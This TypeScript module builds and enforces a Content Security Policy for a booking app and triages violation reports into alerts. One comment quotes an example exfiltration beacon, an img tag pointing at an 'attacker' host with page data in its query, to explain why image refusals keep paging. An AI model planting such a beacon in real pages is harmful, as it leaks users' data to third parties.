/**
 * The script Content Security Policy. It shipped in REPORT ONLY mode first (#2565)
 * and has been ENFORCED since #2575, with a violation paging on the alert channel.
 *
 * Slate's only policy was `frame-ancestors 'none'` on the staff paths. There was
 * no `script-src` or `default-src` anywhere, including on the booker, which is the
 * surface that renders attendee supplied data. React escapes what it renders and
 * the inline scripts are our own theme boot, so there is no known injection today.
 * A script policy is the layer that still holds if one ever appears.
 *
 * Three things were MEASURED before any of this was written, because the previous
 * comment in `security-headers.ts` deferred the work on assumptions:
 *
 *   1. What the deployed booker actually serves (2026-09-18, live production):
 *      4 inline `<script>` tags, 13 external ones and EVERY external one
 *      same-origin. No inline styles and no inline event handlers. So the only
 *      thing standing between Slate and `script-src 'self'` is those 4 inline
 *      tags, which is what the nonce is for.
 *   2. Whether Next applies a nonce under a REPORT ONLY header. The Next docs
 *      describe the nonce being read from `Content-Security-Policy` and say
 *      nothing about the report only variant, which would have made this rollout
 *      pointless: every inline script would be reported on every page and the
 *      noise would bury any real finding. `next/dist/server/app-render/app-render.js`
 *      actually reads
 *      `headers['content-security-policy'] || headers['content-security-policy-report-only']`,
 *      so it does. That is why the middleware sets the policy header on the
 *      REQUEST as well as the response (the enforcing one now, since #2575).
 *   3. That a nonce needs DYNAMIC rendering, since Next applies it while serving
 *      a request. Every route this covers is already dynamic.
 *
 * Enforced since #2575, after reading what production actually reported over the
 * pilot (the seven days to 2026-10-03): 450 reports, every one `img-src` refusing
 * an advisor's Google sign in photo on the manage page, which is why
 * `SIGN_IN_PHOTO_ORIGIN` is allowed for images and nothing else. Cloudflare's
 * analytics beacon, the one off origin script the live pages load, reported
 * nothing: the edge copies this request's nonce onto it (measured on the live
 * booker the same day, 17 of 19 script tags nonced with the beacon among them,
 * and the other two are the theme scripts allowed by hash).
 */

import { THEME_PREFERENCES, themeBootScript } from "@/lib/theme/boot";
import { clientErrorSurface, withoutUrlQuery, type ClientErrorSurface } from "@/lib/api/client-error-scrub";

/** Where a violating browser posts its report. */
export const CSP_REPORT_PATH = "/api/csp-report";

/** The `report-to` group name, defined by the Reporting-Endpoints header. */
export const CSP_REPORT_GROUP = "csp";

/**
 * Where Google serves the photo it hands Slate at sign in (`users.avatar_url`).
 *
 * Allowed for IMAGES only (#2575). The advisor photo resolver draws it for anybody
 * the daily directory run has not reached yet, or when Slate cannot read its own
 * photo table, and every one of the 450 reports measured before enforcing was this
 * host refused on a lead's manage page. Enforced without it, that page draws a
 * broken image where the advisor's face should be. Only `lh3` was ever reported,
 * so the allowance names that host and not the whole of `googleusercontent.com`,
 * which also serves files anybody can upload.
 */
export const SIGN_IN_PHOTO_ORIGIN = "https://lh3.googleusercontent.com";

export interface CspOptions {
  /** This request's nonce. Next applies it to its own inline scripts. */
  nonce: string;
  /**
   * `'sha256-...'` sources for the inline scripts Next does NOT nonce: Slate's
   * own theme boot scripts, written with `dangerouslySetInnerHTML` in the root
   * layout, the app header and the standalone theme.
   *
   * Hashes rather than a nonce, and the choice is load bearing. A nonce would
   * mean reading the request inside the layout, which forces DYNAMIC rendering
   * on every page the layout serves, for a script whose text never varies.
   * Measured on the dev server 2026-09-18: with the nonce alone, 9 of 11 inline
   * scripts on the booker carried it and these were the two that did not, so
   * they would be reported on every page and the noise would bury any real
   * finding.
   */
  scriptHashes?: string[];
  /**
   * True for surfaces that MUST stay embeddable on a partner page. Those get no
   * `frame-ancestors` at all: the whole product is an embed, and a policy that
   * refused framing would black the booker out on somebody else's site, where the
   * only error is in a console we never see.
   */
  frameable: boolean;
  /**
   * #3137: the sources a FRAMEABLE page may be framed by, when the frame lock is on
   * (`frameAncestorSources()` in `embed/frame-policy.ts`). Absent, a frameable page
   * keeps no `frame-ancestors` at all, which is the default until the lock is turned on.
   * Ignored on a page that is not frameable, which is always `'none'`.
   */
  frameAncestors?: readonly string[];
  /**
   * Origins this page's own code connects to beyond Slate itself. The staff sign
   * in page builds a Supabase browser client, which talks to the project's origin;
   * the booker has no such client and passes nothing.
   */
  connectSources?: string[];
}

export function buildContentSecurityPolicy({
  nonce,
  frameable,
  frameAncestors,
  scriptHashes = [],
  connectSources = [],
}: CspOptions): string {
  const framing = !frameable
    ? ["frame-ancestors 'none'"]
    : frameAncestors && frameAncestors.length > 0
      ? [["frame-ancestors", ...frameAncestors].join(" ")]
      : [];
  const directives = [
    "default-src 'self'",
    // 'strict-dynamic' lets the nonced bootstrap load the page's own chunks
    // without naming each one, which is what the 13 same-origin scripts measured
    // above need. 'wasm-unsafe-eval' is for the confirmation mark's player
    // (#2560), which compiles WebAssembly; it permits wasm and nothing else, and
    // is NOT 'unsafe-eval', which would permit arbitrary string evaluation.
    ["script-src 'self'", `'nonce-${nonce}'`, "'strict-dynamic'", "'wasm-unsafe-eval'", ...scriptHashes].join(" "),
    // Inline styles stay allowed: the measurement found none in the markup, but
    // React and the design system set style attributes at runtime, and a style
    // violation is not the attack this policy is about. Tightening it is its own
    // change with its own evidence.
    "style-src 'self' 'unsafe-inline'",
    `img-src 'self' data: blob: ${SIGN_IN_PHOTO_ORIGIN}`,
    "font-src 'self' data:",
    ["connect-src 'self'", ...connectSources].join(" "),
    "media-src 'self'",
    "worker-src 'self' blob:",
    "object-src 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    ...framing,
    // BOTH report directives on purpose. `report-uri` is deprecated and is still
    // the only one Safari and older Chrome send to; `report-to` is its
    // replacement. Shipping one of them means a whole browser family reports
    // nothing, and a browser that reports nothing looks exactly like a browser
    // with nothing to report.
    `report-uri ${CSP_REPORT_PATH}`,
    `report-to ${CSP_REPORT_GROUP}`,
  ];
  return directives.join("; ");
}

/** The companion header that gives `report-to` its destination. */
export function reportingEndpointsHeader(): string {
  return `${CSP_REPORT_GROUP}="${CSP_REPORT_PATH}"`;
}

/**
 * A fresh, unguessable nonce. Uses the Web Crypto API, which the Edge runtime the
 * middleware runs on provides.
 */
export function cspNonce(): string {
  const bytes = new Uint8Array(16);
  crypto.getRandomValues(bytes);
  let binary = "";
  for (const b of bytes) binary += String.fromCharCode(b);
  return btoa(binary);
}

/** How much of a reported URL is worth keeping in a log line. */
const MAX_URI = 300;

/**
 * Strip a booking manage token out of a reported URL.
 *
 * A violation report carries `document-uri`, `referrer` and `blocked-uri`, and on
 * the manage page the URL IS the credential: whoever holds that token can cancel
 * or reschedule the booking with no other authentication. #2564 took it out of the
 * warehouse; it must not walk into the Worker logs through this door instead.
 */
export function redactReportUri(value: string | undefined | null): string {
  if (value === undefined || value === null) return "(none)";
  if (typeof value !== "string") return "(unreadable)";
  // #3046: the query string and fragment go whole, by the same cut the client
  // error beacon uses. On /book the query carries the lead's name, email and
  // phone, percent encoded so no contact shape could match it.
  const redacted = withoutUrlQuery(value).replace(/(\/booking\/manage\/)[^/?#\s]+/g, "$1[redacted]");
  return redacted.length > MAX_URI ? `${redacted.slice(0, MAX_URI - 3)}...` : redacted;
}

export interface ViolationSummary {
  directive: string;
  document: string;
  blocked: string;
  referrer: string;
  /**
   * The script the browser credited, `url:line:column`, or `(none)`. For a refused eval or
   * inline script that is the script that tried it; for a refused load (a font, an image)
   * it is only the script that was running when the load fired, not what asked for it (L799).
   */
  source: string;
  /** Whether the report named that source at all. The one place `(none)` is decided. */
  sourceNamed: boolean;
  /**
   * The named source's URL alone, redacted like `source` but with no line or column, or
   * null when no source is named. Kept apart so a decision about WHICH script it was
   * parses a URL rather than a `url:line:column` string (#4063).
   */
  sourceUrl: string | null;
  /**
   * What the browser did. `report` came from a report only policy and blocked
   * nothing; `unstated` is a browser that does not say (Safari's legacy body).
   */
  disposition: "enforce" | "report" | "unstated";
  /** Whether a browser extension, not a Slate page, caused the refusal. */
  fromExtension: boolean;
}

/** What a report says, in one shape, with nothing sensitive left in it. */
export function summariseViolation(payload: unknown): ViolationSummary {
  const body = readReportBody(payload);
  if (!body) {
    // Never guess a directive for a body we could not read: a made up one sends
    // somebody to fix something no browser reported.
    return {
      directive: "(unreadable)",
      document: "(none)",
      blocked: "(none)",
      referrer: "(none)",
      source: "(none)",
      sourceNamed: false,
      sourceUrl: null,
      disposition: "unstated",
      fromExtension: false,
    };
  }
  return {
    directive: body.directive ?? "(unreadable)",
    document: redactReportUri(body.document),
    blocked: redactReportUri(body.blocked),
    referrer: redactReportUri(body.referrer),
    source: reportSource(body),
    sourceNamed: sourceNamed(body),
    sourceUrl: sourceNamed(body) && body.source !== undefined ? redactReportUri(body.source) : null,
    disposition: body.disposition === "enforce" || body.disposition === "report" ? body.disposition : "unstated",
    fromExtension: [body.blocked, body.source].some((v) => v !== undefined && EXTENSION_SCHEME.test(v)),
  };
}

/**
 * The schemes a browser extension's own resources load from.
 *
 * Matches the bare scheme word as well as the full `scheme://id/...` URL, because
 * Chrome strips the extension id out of CSP reports for privacy and sends the
 * source as the bare word `chrome-extension`, no `://id` and no colon (#3634,
 * measured in production 2026-10-12 on /book: a `script-src-attr` inline refusal
 * that paged although it was an extension's own injected handler). Safari sends
 * the full `safari-web-extension://<uuid>/...` and was already caught. The
 * `(?:$|[:/])` matches the word only as a whole scheme segment, so a value that
 * merely begins with it (`chrome-extension.example.com/x.js`, `chrome-extensions`)
 * still pages; the `^` already keeps an ordinary URL whose host contains the word
 * (`https://chrome-extension.example.com/...`) from matching.
 */
const EXTENSION_SCHEME = /^(chrome|moz|safari|safari-web|ms-browser)-extension(?:$|[:/])/i;

interface RawReport {
  directive?: string;
  document?: string;
  blocked?: string;
  referrer?: string;
  disposition?: string;
  source?: string;
  line?: number;
  column?: number;
}

/**
 * Read either report shape. The legacy `report-uri` body is
 * `{"csp-report": {"document-uri": ..., "violated-directive": ...}}`; the modern
 * Reporting API body is `{"body": {"documentURL": ..., "effectiveDirective": ...}}`,
 * and a browser may post an ARRAY of those. Reading one shape only would drop
 * every report from half the browsers while looking like a working endpoint.
 */
function readReportBody(payload: unknown): RawReport | null {
  const first = Array.isArray(payload) ? payload[0] : payload;
  if (!first || typeof first !== "object") return null;
  const obj = first as Record<string, unknown>;

  const legacy = obj["csp-report"];
  if (legacy && typeof legacy === "object") {
    const l = legacy as Record<string, unknown>;
    return {
      directive: str(l["violated-directive"]) ?? str(l["effective-directive"]),
      document: str(l["document-uri"]),
      blocked: str(l["blocked-uri"]),
      referrer: str(l["referrer"]),
      disposition: str(l["disposition"]),
      source: str(l["source-file"]),
      line: num(l["line-number"]),
      column: num(l["column-number"]),
    };
  }

  const modern = obj.body;
  if (modern && typeof modern === "object") {
    const m = modern as Record<string, unknown>;
    return {
      directive: str(m.effectiveDirective) ?? str(m.violatedDirective),
      document: str(m.documentURL),
      blocked: str(m.blockedURL),
      referrer: str(m.referrer),
      disposition: str(m.disposition),
      source: str(m.sourceFile),
      line: num(m.lineNumber),
      column: num(m.columnNumber),
    };
  }
  return null;
}

function str(v: unknown): string | undefined {
  return typeof v === "string" ? v : undefined;
}

/** A line or column number, and only a plain non negative integer: the body is a stranger's. */
function num(v: unknown): number | undefined {
  return typeof v === "number" && Number.isInteger(v) && v >= 0 ? v : undefined;
}

/** Whether the report says where the refused thing came from. */
function sourceNamed(body: RawReport): boolean {
  return body.source !== undefined && body.source !== "";
}

/**
 * Where the refused thing was tried from, as `url:line:column`, redacted the same
 * way as every other URL in a report.
 *
 * For a refused `eval` or inline script this is the only field that names the code
 * responsible: `blocked` just says `eval`. On 2026-10-04 one such refusal on the
 * manage page could be traced only by joining the report against the Worker's
 * invocation records by hand (it came from a Windows Edge browser, and no script
 * that page loads builds code from a string), so it goes in the log line.
 */
function reportSource(body: RawReport): string {
  if (!sourceNamed(body) || body.source === undefined) return "(none)";
  const where = redactReportUri(body.source);
  if (body.line === undefined) return where;
  return body.column === undefined ? `${where}:${body.line}` : `${where}:${body.line}:${body.column}`;
}

/** The alert key family a violation pages under (#2575). */
export const CSP_VIOLATION_KEY_PREFIX = "csp_violation";

/**
 * Every directive a violation can page under: the policy's own, plus `other`.
 *
 * DERIVED by building the policy and reading its directive names back, so a
 * directive added to the policy is a key by construction rather than a refusal
 * that pages as `other` (L41). The report directives are left out because a
 * browser never refuses anything under them.
 */
export const CSP_ALERT_DIRECTIVES: readonly string[] = [
  ...buildContentSecurityPolicy({ nonce: "x", frameable: false })
    .split(";")
    .map((d) => d.trim().split(/\s+/)[0] ?? "")
    .filter((name) => name && !name.startsWith("report-")),
  "other",
];

/**
 * A reported directive mapped onto that fixed list.
 *
 * The key a page is throttled on is built from this, so it must never carry text
 * from the report: this endpoint is public, and a key per invented directive would
 * be one throttle row and one page per invention. Browsers report the `-elem` and
 * `-attr` variants, and older ones send the directive with its values, so both
 * are folded onto the directive the policy actually declares.
 */
export function cspAlertDirective(raw: string): string {
  const name = (raw.trim().split(/\s+/)[0] ?? "").toLowerCase().replace(/-(elem|attr)$/, "");
  return name !== "other" && CSP_ALERT_DIRECTIVES.includes(name) ? name : "other";
}

/**
 * What was blocked, reduced to something safe to put in Slack.
 *
 * Never the URL: an origin at most, rebuilt from a parse and checked to be a plain
 * host, because whatever this returns is text a stranger chose. A keyword is one
 * of the few the specification defines.
 */
export type BlockedResource =
  | { kind: "keyword"; keyword: BlockedKeyword }
  | { kind: "scheme"; scheme: "data" | "blob" }
  | { kind: "origin"; origin: string }
  | { kind: "unreadable" };

const BLOCKED_KEYWORDS = ["inline", "eval", "wasm-eval", "trusted-types-policy", "trusted-types-sink"] as const;
export type BlockedKeyword = (typeof BLOCKED_KEYWORDS)[number];

export function blockedResource(blocked: string): BlockedResource {
  const value = blocked.trim();
  const keyword = BLOCKED_KEYWORDS.find((k) => k === value);
  if (keyword) return { kind: "keyword", keyword };
  // Chrome reports a data or blob refusal as the bare scheme.
  if (value === "data" || value.startsWith("data:")) return { kind: "scheme", scheme: "data" };
  if (value === "blob" || value.startsWith("blob:")) return { kind: "scheme", scheme: "blob" };
  let url: URL;
  try {
    url = new URL(value);
  } catch {
    return { kind: "unreadable" };
  }
  if (url.protocol !== "https:" && url.protocol !== "http:") return { kind: "unreadable" };
  if (!/^[a-z0-9.-]+(:\d+)?$/.test(url.host)) return { kind: "unreadable" };
  return { kind: "origin", origin: `${url.protocol}//${url.host}` };
}

/** The surface a reported page belongs to, from its path alone. */
function reportedSurface(document: string): ClientErrorSurface {
  try {
    return clientErrorSurface(new URL(document).pathname);
  } catch {
    return "other";
  }
}

export type CspPageDecision =
  | { page: false; why: "report-only" | "extension" | "injected-passive" }
  | {
      page: true;
      key: string;
      directive: string;
      surface: ClientErrorSurface;
      blocked: BlockedResource;
    };

/**
 * The passive directive whose third-party refusal is treated as likely-injected and
 * LOGGED rather than paged (#3417). ONLY `font-src`: a font from a host no Slate page
 * requests blocked nothing a lead needed and is almost always an extension, and a font is
 * not a data-exfiltration channel the way an image or stylesheet is.
 *
 * `img-src`, `style-src` and `media-src` are deliberately NOT here even though an
 * extension often trips them: a blocked third-party image, stylesheet or media request can
 * be an injected-markup exfiltration beacon (`<img src=https://attacker/?d=...>`, CSS
 * exfil), so a refusal there may signal an injection attempt and keeps paging. The ACTIVE
 * and security-critical directives (script-src, connect-src, frame-src, object-src ...)
 * keep paging for the same reason, and so does a refusal of Slate's own origin or a
 * refusal that names a script source (the one exception is a Slate page script as the
 * source of a passive refusal, #4063, see `namedSourceIsExempt`).
 *
 * This logs and does NOT page, rather than trying to page only when "several distinct
 * visitors" hit the host: the only per-visitor signal a CSP report carries is the client
 * IP, which a shared NAT collapses and a rotating caller inflates, so an inline
 * distinct-visitor count is neither reliable nor un-gameable on a public endpoint. A real
 * widespread gap (a font Slate newly uses but forgot to allow) still shows in the logs by
 * host, and detecting it as a page belongs in a monitor-lane aggregate off the hot path
 * (#3598), not here.
 *
 * ONE image is the exception (#3699, Dan 2026-10-13): see `isGoogleProductLogo`. ONE
 * stylesheet is too (#4275, Dan 2026-10-27): see `isGoogleFontsCss`.
 */
const CSP_INJECTED_PASSIVE_DIRECTIVES = new Set(["font-src"]);

/** The one host and path a refused image may be logged rather than paged for (#3699). */
const GOOGLE_PRODUCT_LOGO_HOST = "fonts.gstatic.com";
const GOOGLE_PRODUCT_LOGO_PATH = "/s/i/productlogos/";

/**
 * Whether a refused image is a Google product logo, the one `img-src` refusal treated as
 * injected passive (#3699).
 *
 * A browser add-on draws Google Voice's "click to call" logo
 * (`https://fonts.gstatic.com/s/i/productlogos/voice_2020q4/...`) beside a phone number on
 * the page; Slate never loads it, and it paged production four times in its first week.
 * The exfiltration worry that keeps `img-src` paging is an image request carrying a page's
 * data to a host an ATTACKER reads, and this host is Google's, so the request delivers
 * nothing to anybody who planted it. The match is deliberately narrow: https, the host
 * exactly (no other port, no look alike or sibling subdomain), and the parsed path under
 * the product logo prefix, so a dot segment climbing out of it fails. Any other image from
 * that host and the same path on any other host page, and so does a report naming any
 * source but a Slate page script (#4063, see `isSlatePageScript`).
 * The policy is unchanged: the image is still blocked.
 */
function isGoogleProductLogo(blocked: string): boolean {
  let url: URL;
  try {
    url = new URL(blocked);
  } catch {
    return false;
  }
  return (
    url.protocol === "https:" &&
    url.host === GOOGLE_PRODUCT_LOGO_HOST &&
    url.pathname.startsWith(GOOGLE_PRODUCT_LOGO_PATH)
  );
}

/** The one host, and its css paths, a refused stylesheet may be logged rather than paged for (#4275). */
const GOOGLE_FONTS_CSS_HOST = "fonts.googleapis.com";
const GOOGLE_FONTS_CSS_PATHS = new Set(["/css", "/css2"]);

/**
 * Whether a refused stylesheet is Google Fonts' font CSS, the one `style-src` refusal treated
 * as injected passive (#4275, Dan 2026-10-27).
 *
 * On 2026-10-26 two Safari add-ons on one iPhone injected `https://fonts.googleapis.com/css2`
 * on the manage page; Slate never loads Google Fonts. Each burst sent three reports, two
 * naming the add-on and one naming no source, and that one paged. The exfiltration worry that
 * keeps `style-src` paging is CSS carrying a page's data to a host an ATTACKER reads, and
 * this host is Google's font service, so it delivers nothing to anybody who planted it. The
 * match is as narrow as the logo's: https, the host exactly (no other port, no look alike or
 * sibling subdomain), and the parsed path exactly `/css` or `/css2`. Any other stylesheet
 * from that host and those paths on any other host page, and so does a report naming any
 * source but a Slate page script. The policy is unchanged: the stylesheet is still blocked.
 */
function isGoogleFontsCss(blocked: string): boolean {
  let url: URL;
  try {
    url = new URL(blocked);
  } catch {
    return false;
  }
  return url.protocol === "https:" && url.host === GOOGLE_FONTS_CSS_HOST && GOOGLE_FONTS_CSS_PATHS.has(url.pathname);
}

/** Whether a refusal under this directive, of this resource, is of the passive class. */
function isPassiveRefusal(directive: string, blocked: string): boolean {
  if (CSP_INJECTED_PASSIVE_DIRECTIVES.has(directive)) return true;
  if (directive === "style-src") return isGoogleFontsCss(blocked);
  return directive === "img-src" && isGoogleProductLogo(blocked);
}

/** The host of a (redacted) URL, or null when it is not a readable absolute URL. */
function hostOf(value: string): string | null {
  try {
    return new URL(value).host || null;
  } catch {
    return null;
  }
}

/** Where Next serves Slate's own built page scripts, on the page's own origin. */
const SLATE_PAGE_SCRIPT_PATH = "/_next/static/";

/**
 * Whether a report's named source is one of Slate's own built page scripts: an http(s) URL
 * on exactly the document's origin (scheme, host and port), its parsed path under
 * `/_next/static/`, so a dot segment climbing out of it fails (#4063). An inline or eval
 * source, a source on any other origin (the embedding host page included), a Slate URL
 * outside that path, and an unreadable document are all false, which pages.
 *
 * Why a named source does not settle who asked for the resource (L799): Chrome credits a
 * blocked load to whatever script is on the stack when the load FIRES, not to the code that
 * added the element. On 2026-10-22 the add-on's injected Voice logo, and on 2026-10-24 an
 * add-on's Mulish font, were credited to the embed's ResizeObserver callback, whose
 * `scrollHeight` read forced the layout during which the load started. So a Slate page script
 * as the source means only that Slate code was running at that moment.
 */
function isSlatePageScript(sourceUrl: string | null, document: string): boolean {
  if (sourceUrl === null) return false;
  let source: URL;
  let page: URL;
  try {
    source = new URL(sourceUrl);
    page = new URL(document);
  } catch {
    return false;
  }
  return (
    (source.protocol === "https:" || source.protocol === "http:") &&
    source.protocol === page.protocol &&
    source.host === page.host &&
    source.pathname.startsWith(SLATE_PAGE_SCRIPT_PATH)
  );
}

/**
 * Whether a passive refusal's named source still lets it be logged rather than paged: the
 * source is a Slate page script (#4063, Dan 2026-10-22, for the Google product logo; Dan
 * 2026-10-26 for a third-party font, the same forced layout crediting an add-on's Mulish font
 * to the embed's ResizeObserver on 2026-10-24). Such a source says only that Slate code was
 * running when the browser refused the load (L799), so the refusal reads as one that named no
 * source, and every other test of the passive class still applies to it: a refusal of Slate's
 * own origin, the PP Mori Slate self hosts included, pages whatever its source.
 *
 * Only ever asked of the passive class (`isPassiveRefusal`), so it widens nothing for an
 * image, stylesheet, media or active directive. Any other named source pages: an inline or
 * eval source, a script on another origin, a Slate URL outside `/_next/static/`. A source is
 * no proof Slate requested the resource, but outside its own scripts nothing here can say
 * what else it is, and the source is the only lead to what did.
 */
function namedSourceIsExempt(v: ViolationSummary): boolean {
  return isSlatePageScript(v.sourceUrl, v.document);
}

/**
 * Whether a violation is the injected passive third-party class (#3417): true when it is
 * logged rather than paged, false when it pages at once. False on any doubt, which pages,
 * the safe direction. True needs all of: a passive directive (`font-src`, the Google
 * product logo under `img-src`, #3699, or Google Fonts' css under `style-src`, #4275), no named source or a Slate page script as the source
 * (#4063, `namedSourceIsExempt`), a concrete third-party origin, and a host that is NOT the
 * page's own.
 */
function isInjectedPassive(directive: string, v: ViolationSummary, blocked: BlockedResource): boolean {
  if (!isPassiveRefusal(directive, v.blocked)) return false;
  if (v.sourceNamed && !namedSourceIsExempt(v)) return false;
  if (blocked.kind !== "origin") return false; // inline/eval/data/blob/unreadable page at once
  const blockedHost = hostOf(blocked.origin);
  const documentHost = hostOf(v.document);
  if (blockedHost === null || documentHost === null) return false; // cannot prove third-party -> page
  return blockedHost !== documentHost; // Slate's own origin is a real gap and pages; a third-party does not
}

/**
 * Whether a violation pages, and under which key (#2575, Dan 2026-10-02).
 *
 * Enforced, a violation means something was refused for a real person, so it
 * pages. Three refusals do not page (all still logged): a report only report blocked
 * nothing, an extension's own resource is the person's browser rather than Slate's page,
 * and a passive third-party resource (the `injected-passive` reason below). A report that
 * does not state its disposition pages, because the only policy Slate serves now enforces
 * and Safari's legacy body never says.
 *
 * A THIRD non-paging reason, `injected-passive` (#3417): a passive third-party resource
 * no Slate page requests, with no named source (or a Slate page script as the source,
 * #4063), is almost always an extension and is logged
 * rather than paged (see isInjectedPassive).
 *
 * Keyed on the DIRECTIVE, not one key for the whole policy: a stray image refusal
 * must not silence a script refusal behind it for the cooldown's length (L707).
 */
export function cspViolationPage(v: ViolationSummary): CspPageDecision {
  if (v.disposition === "report") return { page: false, why: "report-only" };
  if (v.fromExtension) return { page: false, why: "extension" };
  const directive = cspAlertDirective(v.directive);
  const blocked = blockedResource(v.blocked);
  if (isInjectedPassive(directive, v, blocked)) return { page: false, why: "injected-passive" };
  return {
    page: true,
    key: `${CSP_VIOLATION_KEY_PREFIX}:${directive}`,
    directive,
    surface: reportedSurface(v.document),
    blocked,
  };
}


/**
 * Every inline script text Slate's own theme boot rule can emit.
 *
 * DERIVED from the preference vocabulary rather than listed, so a fourth
 * preference cannot ship a script the policy has never heard of (L41, L96). The
 * four live call sites are the root layout (`kind: "cookie"`), the standalone
 * theme (light and dark) and the app header (the signed in preference, with
 * `remember`), and `scripts/test-...` plus the vitest suite hold this set against
 * what those components actually render.
 */
export function themeBootScriptTexts(): string[] {
  const texts = [themeBootScript({ kind: "cookie" })];
  for (const preference of THEME_PREFERENCES) {
    for (const remember of [false, true]) {
      texts.push(themeBootScript({ kind: "preference", preference, remember }));
    }
  }
  return [...new Set(texts)];
}

let hashCache: Promise<string[]> | null = null;

/**
 * The `'sha256-...'` sources for those scripts.
 *
 * Computed once per isolate: the set is fixed at build time, and hashing seven
 * short strings on every request would be paid on the booker's hot path for an
 * answer that never changes. `crypto.subtle` is what the Edge runtime the
 * middleware runs on provides.
 */
export function themeScriptHashes(): Promise<string[]> {
  hashCache ??= Promise.all(
    themeBootScriptTexts().map(async (text) => {
      const digest = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(text));
      let binary = "";
      for (const b of new Uint8Array(digest)) binary += String.fromCharCode(b);
      return `'sha256-${btoa(binary)}'`;
    }),
  );
  return hashCache;
}
